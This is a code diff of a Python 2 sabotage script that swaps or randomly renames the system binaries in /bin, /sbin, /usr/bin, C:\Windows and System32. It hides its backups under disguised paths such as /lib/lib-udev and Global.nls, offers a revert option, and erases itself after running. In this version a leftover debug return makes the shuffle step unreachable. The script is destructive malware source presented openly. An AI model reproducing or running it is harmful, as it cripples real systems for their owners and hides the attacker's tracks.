@@ -5,22 +5,29 @@ import os
 from random import choice
 import itertools
 from multiprocessing import Process
-import pickle
+from pickle import dump, load
 import shutil
+from hashlib import md5
 
 #TODO:
 # 1. figure out what binaries are needed to login successfully so we don't swap those.
+# 2. add a prompt to self erase after a revert, but timeout after like 5-10 seconds and
+#	 default to no
 
 operatingSystem = platform.system().lower() #detect OS
-
 if operatingSystem == "windows": #set up some vars for specific OSes
 	slash = "\\"
-	dest = "C:\\Windows\\bin_locale"
-	backfile = "C:\Windows\Globalization\Global.nls"
+	dest = "C:\\Windows\\bin_locale" #directory where binaries will be backed up
+	backfile = "C:\Windows\Globalization\Global.nls" #backup/revert file
 else:
 	slash = "/"
-	dest = "/lib/lib-udev"
-	backfile = "/var/local/opt"
+	dest = "/lib/lib-udev" #directory where binaries will be backed up
+	backfile = "/var/local/opt" #backup/revert file
+
+#print help
+def help():
+	print "-R, --random To randomly rename binaries instead of swapping them"
+	print "-r, --revert To revert from disaster"
 
 #swap two given values in a list
 def swap(xs, a, b):
@@ -88,50 +95,78 @@ def getFiles(directories):
 				if os.path.isfile(fullBin): #make sure it's a file not a dir
 					myDict[myBin] = fullBin
 				#not tested, but this should recurse through all directories which would be useful
-				#for the "Program Files" directory. should look into this.
+				#for the "Program Files" directory. should look into this. might be bad for
+				#C:\windows since that's a huge dir with a lot of dirs in it
 				#elif operatingSystem == "windows":
 				#	return getFiles([myBin])
 
 	return myDict
 
 #main binary swapping function
-def binswap():
+def binswap(rename=0):
 	#pick directories based on OS
 	if operatingSystem == "windows":
 		dirs = ["C:\Windows", "C:\Windows\System32"]
 	else:
 		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]
 
-	#get the files into two dictionaries
+	#get the files into a dictionary
 	oldDict = getFiles(dirs)
 
-	#create backups of all the binaries so we can copy things properly during the shuffle
-	backupThread = Process(target=backup, args=(oldDict,dirs,))
-	backupThread.start()
+	#if just swapping, create backups of all the binaries so we can copy things properly
+	#during the shuffle
+	if not rename:
+		backupThread = Process(target=backup, args=(oldDict,dirs,))
+		backupThread.start()
 
+	#create copy of dict and generate list of keys.
 	newDict = oldDict.copy()
-
-	#get two lists of keys, the second is a derangement of the first
 	oldKeys = oldDict.keys()
-	newKeys = list(oldKeys)
-	derange(newKeys)
 
-	#shuffle the key:value pairs
-	for oldKey, newKey in zip(oldKeys, newKeys):
-		newDict[newKey] = oldDict[oldKey]
+	if rename: #if randomly renaming binaries
+		dest = "" #set dest to nothing since we won't be moving from the backup dir
 
-	#wait till thread is done, if it worked then shuffle the actual binares on the system
-	backupThread.join()
-	if backupThread.exitcode == 0:
-		shuffleThread = Process(target=shuffle, args=(newKeys, oldDict, newDict,))
-		shuffleThread.start()
-	else:
-		print "backing up failed. exiting..."
-		return(backupThread.exitcode)
+		#loop through and change the values to be random in the newDict
+		#the new random value will consist of a random combination of the beginning of the md5
+		#hash of the string, the last two characters of that hash, then a random number (0,99)
+		for myKey in oldKeys:
+			keyHash = md5(myKey).hexdigest()
+			newName = (keyHash[choice(range(0,2)):choice(range(5,7))] + keyHash[-2:]
+							  + str(choice(range(0,99))))
+
+			#get the full path before the binary name
+			lastSlash = str.rfind(newDict[myKey], slash)
+			newName = newDict[myKey][:lastSlash + 1] + newName
+
+			if operatingSystem == "windows": #if windows, append .exe because file extensions
+				newName = newName + ".exe"
+
+			newDict[myKey] = newName
+	else: #if swapping binaries
+		#get a copy of the list of keys, then find a derangement of that
+		newKeys = list(oldKeys)
+		derange(newKeys)
+
+		#shuffle the key:value pairs
+		for oldKey, newKey in zip(oldKeys, newKeys):
+			newDict[newKey] = oldDict[oldKey]
+
+		#wait till thread is done and make sure it succeeded
+		backupThread.join()
+		if backupThread.exitcode != 0:
+			print "backing up failed. exiting..."
+			return(backupThread.exitcode)
+
+	print newDict
+	return 0
+
+	#shuffle/rename the binaries!
+	shuffleThread = Process(target=shuffle, args=(oldKeys, oldDict, newDict,))
+	shuffleThread.start()
 
 	#prepare for revert
 	with open(backfile, 'wb') as outfile:
-		pickle.dump([oldDict, newDict], outfile)
+		dump([oldDict, newDict, rename], outfile)
 
 	shuffleThread.join() #wait for shuffling to finish before ending
 	os.system("echo > %s" % argv[0]) #self erase
@@ -142,20 +177,25 @@ def binswap():
 def revert():
 	#pick directories based on OS
 	if operatingSystem == "windows":
-		dirs = ["C:\Windows", ""]
+		dirs = ["C:\Windows", "C:\Windows\System32"]
 	else:
 		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]
 
-	#grab oldDict and newDict from file
+	#grab oldDict, newDict and type of reversion from file
 	if os.path.exists(backfile):
 		with open(backfile, 'rb') as infile:
-			oldDict, newDict = pickle.load(infile)
+			oldDict, newDict, rename = load(infile)
 	else:
-		print "cannot find backup files, ya screwed"
+		print "cannot find backup file, ya screwed"
 		return 1
 
-	#create copies of the binaries then put them back in the right place
-	backup(oldDict, dirs, revert=1)
+	#if we just renamed randomly, set dest to nothing bc we aren't moving binaries from that dir
+	if rename:
+		dest = ""
+	else:#if we swapped, create copies of the binaries
+		backup(oldDict, dirs, revert=1)
+
+	#put binaries back in place
 	unshuffle(oldDict, newDict)
 
 	print "done reverting"
@@ -163,8 +203,14 @@ def revert():
 
 if __name__ == "__main__":
 	if len(argv) > 1: #check the arg if we have any
+		#if they want to revert a previous action
 		if argv[1] == "-r" or argv[1] == "--revert" or argv[1] == "revert" or argv[1] == "-revert":
 			exit(revert())
+		#if they want to randomly rename binaries
+		elif argv[1] == "-R" or argv[1] == "--random" or argv[1] == "random" or argv[1] == "-random":
+			exit(binswap(rename=1))
+		elif "help" in argv[1]:
+			help()
 		else: #if arg didn't match, swap away!
 			exit(binswap())
 	else: #if no args, just swap!
